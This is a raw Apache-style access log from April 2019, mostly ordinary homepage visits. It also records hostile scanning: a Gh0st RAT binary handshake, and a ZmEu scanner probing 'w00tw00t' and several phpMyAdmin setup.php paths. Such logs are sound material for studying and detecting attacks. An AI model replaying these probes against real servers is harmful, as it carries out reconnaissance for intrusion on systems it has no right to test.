137.74.30.53 - - [14/Apr/2019:17:01:13 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
66.240.205.34 - - [14/Apr/2019:17:43:04 +0800] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 173 "-" "-"
212.156.216.18 - - [14/Apr/2019:17:53:28 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
187.192.32.250 - - [14/Apr/2019:19:18:43 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
103.49.56.14 - - [14/Apr/2019:19:39:07 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
54.242.155.91 - - [14/Apr/2019:19:49:41 +0800] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 1121 "-" "ZmEu"
54.242.155.91 - - [14/Apr/2019:19:49:42 +0800] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 1121 "-" "ZmEu"
54.242.155.91 - - [14/Apr/2019:19:49:42 +0800] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 1121 "-" "ZmEu"
54.242.155.91 - - [14/Apr/2019:19:49:43 +0800] "GET /pma/scripts/setup.php HTTP/1.1" 404 1121 "-" "ZmEu"
54.242.155.91 - - [14/Apr/2019:19:49:43 +0800] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 1121 "-" "ZmEu"
54.242.155.91 - - [14/Apr/2019:19:49:44 +0800] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 1121 "-" "ZmEu"
54.242.155.91 - - [14/Apr/2019:19:49:45 +0800] "GET  HTTP/1.1" 400 173 "-" "-"
203.189.141.103 - - [14/Apr/2019:20:43:19 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
31.154.54.235 - - [14/Apr/2019:22:05:36 +0800] "GET / HTTP/1.1" 200 12678 "-" "-"
172.104.108.109 - - [14/Apr/2019:22:33:39 +0800] "GET / HTTP/1.1" 200 12678 "-" "Go-http-client/1.1"
